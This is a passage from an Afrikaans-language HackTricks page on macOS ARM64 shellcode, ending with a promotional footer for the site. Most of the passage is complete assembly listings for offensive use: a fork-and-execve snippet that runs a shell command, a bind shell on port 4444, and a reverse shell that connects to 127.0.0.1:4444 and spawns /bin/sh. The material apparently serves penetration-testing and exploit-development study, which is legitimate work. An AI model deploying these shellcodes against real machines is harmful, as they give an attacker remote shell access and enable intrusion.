mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind skulp

Bind skulp vanaf [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **poort 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Omgekeerde skulp

Vanaf [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
